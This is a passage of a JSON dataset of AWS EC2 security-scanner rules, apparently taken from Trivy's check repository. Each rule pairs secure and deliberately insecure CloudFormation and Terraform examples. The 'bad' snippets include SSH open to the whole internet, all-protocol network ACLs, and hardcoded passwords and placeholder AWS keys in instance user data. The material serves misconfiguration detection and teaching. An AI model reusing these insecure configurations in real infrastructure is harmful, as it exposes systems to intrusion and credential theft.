              "Resources:\n  BadExample:\n    Type: AWS::EC2::Volume"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#kms_key_id"
            ],
            "good": [
              "resource \"aws_kms_key\" \"ebs_encryption\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_ebs_volume\" \"example\" {\n  kms_key_id = aws_kms_key.ebs_encryption.arn\n}"
            ],
            "bad": [
              "resource \"aws_ebs_volume\" \"example\" {}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ENFORCE_HTTP_TOKEN_IMDS",
        "title": "Enforce Http Token Imds",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options\n  good:\n    - |-\n      resource \"aws_instance\" \"good_example\" {\n        ami           = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n        metadata_options {\n          http_tokens = \"required\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_instance\" \"bad_example\" {\n        ami           = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n      }\n",
        "file_name": "enforce_http_token_imds.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/enforce_http_token_imds.yaml",
        "local_path": "aws/ec2/enforce_http_token_imds.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options"
            ],
            "good": [
              "resource \"aws_instance\" \"good_example\" {\n  ami           = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n  metadata_options {\n    http_tokens = \"required\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_instance\" \"bad_example\" {\n  ami           = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_DEFAULT_VPC",
        "title": "No Default Vpc",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_vpc\n  good:\n    - |-\n      # no aws default vpc present\n      resource \"aws_vpc\" \"main\" {\n        cidr_block = \"10.0.0.0/16\"\n      }\n  bad:\n    - |-\n      resource \"aws_default_vpc\" \"default\" {\n        tags = {\n          Name = \"Default VPC\"\n        }\n      }\n",
        "file_name": "no_default_vpc.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_default_vpc.yaml",
        "local_path": "aws/ec2/no_default_vpc.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_vpc"
            ],
            "good": [
              "# no aws default vpc present\nresource \"aws_vpc\" \"main\" {\n  cidr_block = \"10.0.0.0/16\"\n}"
            ],
            "bad": [
              "resource \"aws_default_vpc\" \"default\" {\n  tags = {\n    Name = \"Default VPC\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_EXCESSIVE_PORT_ACCESS",
        "title": "No Excessive Port Access",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        NetworkACL:\n          Type: AWS::EC2::NetworkAcl\n          Properties:\n            RuleAction: allow\n            VpcId: something\n\n        Rule:\n          Type: AWS::EC2::NetworkAclEntry\n          Properties:\n            NetworkAclId: !Ref NetworkACL\n            Protocol: 6\n            Ref: NetworkACL\n            RuleAction: allow\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        NetworkACL:\n          Type: AWS::EC2::NetworkAcl\n          Properties:\n            RuleAction: allow\n            VpcId: something\n\n        Rule:\n          Type: AWS::EC2::NetworkAclEntry\n          Properties:\n            NetworkAclId: !Ref NetworkACL\n            Protocol: -1\n            Ref: NetworkACL\n            RuleAction: allow\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#to_port\n  good:\n    - |-\n      resource \"aws_network_acl_rule\" \"good_example\" {\n        egress      = false\n        protocol    = \"tcp\"\n        from_port   = 22\n        to_port     = 22\n        rule_action = \"allow\"\n        cidr_block  = \"0.0.0.0/0\"\n      }\n  bad:\n    - |-\n      resource \"aws_network_acl_rule\" \"bad_example\" {\n        egress      = false\n        protocol    = \"all\"\n        rule_action = \"allow\"\n        cidr_block  = \"0.0.0.0/0\"\n      }\n",
        "file_name": "no_excessive_port_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_excessive_port_access.yaml",
        "local_path": "aws/ec2/no_excessive_port_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  NetworkACL:\n    Type: AWS::EC2::NetworkAcl\n    Properties:\n      RuleAction: allow\n      VpcId: something\n\n  Rule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n      NetworkAclId: !Ref NetworkACL\n      Protocol: 6\n      Ref: NetworkACL\n      RuleAction: allow"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  NetworkACL:\n    Type: AWS::EC2::NetworkAcl\n    Properties:\n      RuleAction: allow\n      VpcId: something\n\n  Rule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n      NetworkAclId: !Ref NetworkACL\n      Protocol: -1\n      Ref: NetworkACL\n      RuleAction: allow"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#to_port"
            ],
            "good": [
              "resource \"aws_network_acl_rule\" \"good_example\" {\n  egress      = false\n  protocol    = \"tcp\"\n  from_port   = 22\n  to_port     = 22\n  rule_action = \"allow\"\n  cidr_block  = \"0.0.0.0/0\"\n}"
            ],
            "bad": [
              "resource \"aws_network_acl_rule\" \"bad_example\" {\n  egress      = false\n  protocol    = \"all\"\n  rule_action = \"allow\"\n  cidr_block  = \"0.0.0.0/0\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_PUBLIC_EGRESS_SGR",
        "title": "No Public Egress Sgr",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-securitygroup.html\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        BadSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupEgress:\n              - CidrIp: 127.0.0.1/32\n                IpProtocol: \"6\"\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        BadSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupEgress:\n              - CidrIp: 0.0.0.0/0\n                IpProtocol: \"6\"\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group\n  good:\n    - |-\n      resource \"aws_security_group\" \"good_example\" {\n        egress {\n          cidr_blocks = [\"1.2.3.4/32\"]\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_security_group\" \"bad_example\" {\n        egress {\n          cidr_blocks = [\"0.0.0.0/0\"]\n        }\n      }\n",
        "file_name": "no_public_egress_sgr.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_public_egress_sgr.yaml",
        "local_path": "aws/ec2/no_public_egress_sgr.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-securitygroup.html"
            ],
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  BadSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupEgress:\n        - CidrIp: 127.0.0.1/32\n          IpProtocol: \"6\""
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  BadSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupEgress:\n        - CidrIp: 0.0.0.0/0\n          IpProtocol: \"6\""
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group"
            ],
            "good": [
              "resource \"aws_security_group\" \"good_example\" {\n  egress {\n    cidr_blocks = [\"1.2.3.4/32\"]\n  }\n}"
            ],
            "bad": [
              "resource \"aws_security_group\" \"bad_example\" {\n  egress {\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_PUBLIC_INGRESS_ACL",
        "title": "No Public Ingress Acl",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-networkaclentry.html\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        NetworkACL:\n          Type: AWS::EC2::NetworkAcl\n          Properties:\n            VpcId: something\n\n        Rule:\n          Type: AWS::EC2::NetworkAclEntry\n          Properties:\n            CidrBlock: 10.0.0.0/8\n            NetworkAclId: !Ref NetworkACL\n            Protocol: 6\n            RuleAction: allow\n            PortRange:\n              From: 22\n              To: 22\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        NetworkACL:\n          Type: AWS::EC2::NetworkAcl\n          Properties:\n            VpcId: something\n\n        Rule:\n          Type: AWS::EC2::NetworkAclEntry\n          Properties:\n            CidrBlock: 0.0.0.0/0\n            NetworkAclId: !Ref NetworkACL\n            Protocol: 6\n            RuleAction: allow\n            PortRange:\n              From: 22\n              To: 22\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block\n  good:\n    - |-\n      resource \"aws_network_acl_rule\" \"good_example\" {\n        egress      = false\n        protocol    = \"tcp\"\n        from_port   = 22\n        to_port     = 22\n        rule_action = \"allow\"\n        cidr_block  = \"10.0.0.0/16\"\n      }\n  bad:\n    - |-\n      resource \"aws_network_acl_rule\" \"bad_example\" {\n        egress      = false\n        protocol    = \"tcp\"\n        from_port   = 22\n        to_port     = 22\n        rule_action = \"allow\"\n        cidr_block  = \"0.0.0.0/0\"\n      }\n",
        "file_name": "no_public_ingress_acl.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_public_ingress_acl.yaml",
        "local_path": "aws/ec2/no_public_ingress_acl.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-networkaclentry.html"
            ],
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  NetworkACL:\n    Type: AWS::EC2::NetworkAcl\n    Properties:\n      VpcId: something\n\n  Rule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n      CidrBlock: 10.0.0.0/8\n      NetworkAclId: !Ref NetworkACL\n      Protocol: 6\n      RuleAction: allow\n      PortRange:\n        From: 22\n        To: 22"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  NetworkACL:\n    Type: AWS::EC2::NetworkAcl\n    Properties:\n      VpcId: something\n\n  Rule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n      CidrBlock: 0.0.0.0/0\n      NetworkAclId: !Ref NetworkACL\n      Protocol: 6\n      RuleAction: allow\n      PortRange:\n        From: 22\n        To: 22"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block"
            ],
            "good": [
              "resource \"aws_network_acl_rule\" \"good_example\" {\n  egress      = false\n  protocol    = \"tcp\"\n  from_port   = 22\n  to_port     = 22\n  rule_action = \"allow\"\n  cidr_block  = \"10.0.0.0/16\"\n}"
            ],
            "bad": [
              "resource \"aws_network_acl_rule\" \"bad_example\" {\n  egress      = false\n  protocol    = \"tcp\"\n  from_port   = 22\n  to_port     = 22\n  rule_action = \"allow\"\n  cidr_block  = \"0.0.0.0/0\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_PUBLIC_INGRESS_SGR",
        "title": "No Public Ingress Sgr",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-securitygroup.html\n  good:\n    - |-\n      Resources:\n        GoodSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupIngress:\n              - CidrIp: 127.0.0.1/32\n                IpProtocol: \"6\"\n                FromPort: 22\n                ToPort: 22\n  bad:\n    - |-\n      Resources:\n        BadSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupIngress:\n              - CidrIp: 0.0.0.0/0\n                IpProtocol: \"6\"\n                FromPort: 22\n                ToPort: 22\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule#cidr_blocks\n  good:\n    - |-\n      resource \"aws_security_group_rule\" \"good_example\" {\n        type        = \"ingress\"\n        cidr_blocks = [\"10.0.0.0/16\"]\n      }\n    - |-\n      resource \"aws_security_group_rule\" \"example\" {\n        type              = \"ingress\"\n        security_group_id = \"sg-123456\"\n        from_port         = 22\n        to_port           = 22\n        protocol          = \"tcp\"\n        cidr_blocks = [\n          \"1.2.3.4/32\",\n          \"4.5.6.7/32\",\n        ]\n      }\n  bad:\n    - |-\n      resource \"aws_security_group_rule\" \"bad_example\" {\n        type        = \"ingress\"\n        from_port   = 22\n        to_port     = 22\n        protocol    = \"tcp\"\n        cidr_blocks = [\"0.0.0.0/0\"]\n      }\n",
        "file_name": "no_public_ingress_sgr.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_public_ingress_sgr.yaml",
        "local_path": "aws/ec2/no_public_ingress_sgr.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-securitygroup.html"
            ],
            "good": [
              "Resources:\n  GoodSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupIngress:\n        - CidrIp: 127.0.0.1/32\n          IpProtocol: \"6\"\n          FromPort: 22\n          ToPort: 22"
            ],
            "bad": [
              "Resources:\n  BadSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupIngress:\n        - CidrIp: 0.0.0.0/0\n          IpProtocol: \"6\"\n          FromPort: 22\n          ToPort: 22"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule#cidr_blocks"
            ],
            "good": [
              "resource \"aws_security_group_rule\" \"good_example\" {\n  type        = \"ingress\"\n  cidr_blocks = [\"10.0.0.0/16\"]\n}",
              "resource \"aws_security_group_rule\" \"example\" {\n  type              = \"ingress\"\n  security_group_id = \"sg-123456\"\n  from_port         = 22\n  to_port           = 22\n  protocol          = \"tcp\"\n  cidr_blocks = [\n    \"1.2.3.4/32\",\n    \"4.5.6.7/32\",\n  ]\n}"
            ],
            "bad": [
              "resource \"aws_security_group_rule\" \"bad_example\" {\n  type        = \"ingress\"\n  from_port   = 22\n  to_port     = 22\n  protocol    = \"tcp\"\n  cidr_blocks = [\"0.0.0.0/0\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_PUBLIC_IP",
        "title": "No Public Ip",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-autoscaling-launchconfiguration.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            ImageId: ami-123456\n            InstanceType: t2.small\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            AssociatePublicIpAddress: true\n            ImageId: ami-123456\n            InstanceType: t2.small\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#associate_public_ip_address\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#associate_public_ip_address\n  good:\n    - |-\n      resource \"aws_launch_configuration\" \"good_example\" {\n        associate_public_ip_address = false\n      }\n  bad:\n    - |-\n      resource \"aws_launch_configuration\" \"bad_example\" {\n        associate_public_ip_address = true\n      }\n",
        "file_name": "no_public_ip.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_public_ip.yaml",
        "local_path": "aws/ec2/no_public_ip.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-autoscaling-launchconfiguration.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      ImageId: ami-123456\n      InstanceType: t2.small"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      AssociatePublicIpAddress: true\n      ImageId: ami-123456\n      InstanceType: t2.small"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#associate_public_ip_address",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#associate_public_ip_address"
            ],
            "good": [
              "resource \"aws_launch_configuration\" \"good_example\" {\n  associate_public_ip_address = false\n}"
            ],
            "bad": [
              "resource \"aws_launch_configuration\" \"bad_example\" {\n  associate_public_ip_address = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_PUBLIC_IP_SUBNET",
        "title": "No Public Ip Subnet",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-subnet.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EC2::Subnet\n          Properties:\n            VpcId: vpc-123456\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EC2::Subnet\n          Properties:\n            MapPublicIpOnLaunch: true\n            VpcId: vpc-123456\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/subnet#map_public_ip_on_launch\n  good:\n    - |-\n      resource \"aws_subnet\" \"good_example\" {\n        vpc_id                  = \"vpc-123456\"\n        map_public_ip_on_launch = false\n      }\n  bad:\n    - |-\n      resource \"aws_subnet\" \"bad_example\" {\n        vpc_id                  = \"vpc-123456\"\n        map_public_ip_on_launch = true\n      }\n",
        "file_name": "no_public_ip_subnet.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_public_ip_subnet.yaml",
        "local_path": "aws/ec2/no_public_ip_subnet.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-subnet.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: vpc-123456"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EC2::Subnet\n    Properties:\n      MapPublicIpOnLaunch: true\n      VpcId: vpc-123456"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/subnet#map_public_ip_on_launch"
            ],
            "good": [
              "resource \"aws_subnet\" \"good_example\" {\n  vpc_id                  = \"vpc-123456\"\n  map_public_ip_on_launch = false\n}"
            ],
            "bad": [
              "resource \"aws_subnet\" \"bad_example\" {\n  vpc_id                  = \"vpc-123456\"\n  map_public_ip_on_launch = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_SECRETS_IN_USER_DATA",
        "title": "No Secrets In User Data",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EC2::Instance\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: /dev/sdm\n                Ebs:\n                  DeleteOnTermination: \"false\"\n                  Iops: \"200\"\n                  VolumeSize: \"20\"\n                  VolumeType: io1\n              - DeviceName: /dev/sdk\n            ImageId: ami-79fd7eee\n            KeyName: testkey\n            UserData: export SSM_PATH=/database/creds\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EC2::Instance\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: /dev/sdm\n                Ebs:\n                  DeleteOnTermination: \"false\"\n                  Iops: \"200\"\n                  VolumeSize: \"20\"\n                  VolumeType: io1\n              - DeviceName: /dev/sdk\n            ImageId: ami-79fd7eee\n            KeyName: testkey\n            UserData: export DATABASE_PASSWORD=password1234\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data\n  good:\n    - |-\n      resource \"aws_instance\" \"good_example\" {\n        ami           = \"ami-12345667\"\n        instance_type = \"t2.small\"\n\n        user_data = <<EOF\n      \t export GREETING=hello\n       EOF\n      }\n  bad:\n    - |-\n      resource \"aws_instance\" \"bad_example\" {\n        ami           = \"ami-12345667\"\n        instance_type = \"t2.small\"\n        user_data     = <<EOF\n          export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n          export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n          export AWS_DEFAULT_REGION=us-west-2\n        EOF\n      }\n",
        "file_name": "no_secrets_in_user_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_secrets_in_user_data.yaml",
        "local_path": "aws/ec2/no_secrets_in_user_data.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EC2::Instance\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: /dev/sdm\n          Ebs:\n            DeleteOnTermination: \"false\"\n            Iops: \"200\"\n            VolumeSize: \"20\"\n            VolumeType: io1\n        - DeviceName: /dev/sdk\n      ImageId: ami-79fd7eee\n      KeyName: testkey\n      UserData: export SSM_PATH=/database/creds"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EC2::Instance\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: /dev/sdm\n          Ebs:\n            DeleteOnTermination: \"false\"\n            Iops: \"200\"\n            VolumeSize: \"20\"\n            VolumeType: io1\n        - DeviceName: /dev/sdk\n      ImageId: ami-79fd7eee\n      KeyName: testkey\n      UserData: export DATABASE_PASSWORD=password1234"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data"
            ],
            "good": [
              "resource \"aws_instance\" \"good_example\" {\n  ami           = \"ami-12345667\"\n  instance_type = \"t2.small\"\n\n  user_data = <<EOF\n\t export GREETING=hello\n EOF\n}"
            ],
            "bad": [
              "resource \"aws_instance\" \"bad_example\" {\n  ami           = \"ami-12345667\"\n  instance_type = \"t2.small\"\n  user_data     = <<EOF\n    export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n    export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n    export AWS_DEFAULT_REGION=us-west-2\n  EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_SENSITIVE_INFO",
        "title": "No Sensitive Info",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#user_data,user_data_base64\n  good:\n    - |-\n      resource \"aws_launch_configuration\" \"as_conf\" {\n        name          = \"web_config\"\n        image_id      = data.aws_ami.ubuntu.id\n        instance_type = \"t2.micro\"\n        user_data     = <<EOF\n       export GREETING=\"Hello there\"\n       EOF\n      }\n    - |-\n      resource \"aws_launch_configuration\" \"as_conf\" {\n        name             = \"web_config\"\n        image_id         = data.aws_ami.ubuntu.id\n        instance_type    = \"t2.micro\"\n        user_data_base64 = \"ZXhwb3J0IEVESVRPUj12aW1hY3M=\"\n      }\n  bad:\n    - |-\n      resource \"aws_launch_configuration\" \"as_conf\" {\n        name          = \"web_config\"\n        image_id      = data.aws_ami.ubuntu.id\n        instance_type = \"t2.micro\"\n        user_data     = <<EOF\n       export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n       EOF\n      }\n    - |-\n      resource \"aws_launch_configuration\" \"as_conf\" {\n        name             = \"web_config\"\n        image_id         = data.aws_ami.ubuntu.id\n        instance_type    = \"t2.micro\"\n        user_data_base64 = \"ZXhwb3J0IERBVEFCQVNFX1BBU1NXT1JEPSJTb21lU29ydE9mUGFzc3dvcmQi\"\n      }\n",
        "file_name": "no_sensitive_info.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_sensitive_info.yaml",
        "local_path": "aws/ec2/no_sensitive_info.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#user_data,user_data_base64"
            ],
            "good": [
              "resource \"aws_launch_configuration\" \"as_conf\" {\n  name          = \"web_config\"\n  image_id      = data.aws_ami.ubuntu.id\n  instance_type = \"t2.micro\"\n  user_data     = <<EOF\n export GREETING=\"Hello there\"\n EOF\n}",
              "resource \"aws_launch_configuration\" \"as_conf\" {\n  name             = \"web_config\"\n  image_id         = data.aws_ami.ubuntu.id\n  instance_type    = \"t2.micro\"\n  user_data_base64 = \"ZXhwb3J0IEVESVRPUj12aW1hY3M=\"\n}"
            ],
            "bad": [
              "resource \"aws_launch_configuration\" \"as_conf\" {\n  name          = \"web_config\"\n  image_id      = data.aws_ami.ubuntu.id\n  instance_type = \"t2.micro\"\n  user_data     = <<EOF\n export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n EOF\n}",
              "resource \"aws_launch_configuration\" \"as_conf\" {\n  name             = \"web_config\"\n  image_id         = data.aws_ami.ubuntu.id\n  instance_type    = \"t2.micro\"\n  user_data_base64 = \"ZXhwb3J0IERBVEFCQVNFX1BBU1NXT1JEPSJTb21lU29ydE9mUGFzc3dvcmQi\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-REQUIRE_VPC_FLOW_LOGS_FOR_ALL_VPCS",
        "title": "Require Vpc Flow Logs For All Vpcs",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  good:\n    - |-\n      resource \"aws_vpc\" \"example\" {\n        cidr_block = \"10.0.0.0/16\"\n      }\n\n      resource \"aws_flow_log\" \"example\" {\n        log_group_name = \"example\"\n        traffic_type   = \"ALL\"\n        vpc_id         = aws_vpc.example.id\n      }\n  bad:\n    - |-\n      resource \"aws_vpc\" \"example\" {\n        cidr_block = \"10.0.0.0/16\"\n      }\n",
        "file_name": "require_vpc_flow_logs_for_all_vpcs.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/require_vpc_flow_logs_for_all_vpcs.yaml",
        "local_path": "aws/ec2/require_vpc_flow_logs_for_all_vpcs.yaml",
        "parsed_metadata": {
          "terraform": {
            "good": [
              "resource \"aws_vpc\" \"example\" {\n  cidr_block = \"10.0.0.0/16\"\n}\n\nresource \"aws_flow_log\" \"example\" {\n  log_group_name = \"example\"\n  traffic_type   = \"ALL\"\n  vpc_id         = aws_vpc.example.id\n}"
            ],
            "bad": [
              "resource \"aws_vpc\" \"example\" {\n  cidr_block = \"10.0.0.0/16\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-SPECIFY_AMI_OWNERS",
        "title": "Specify Ami Owners",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
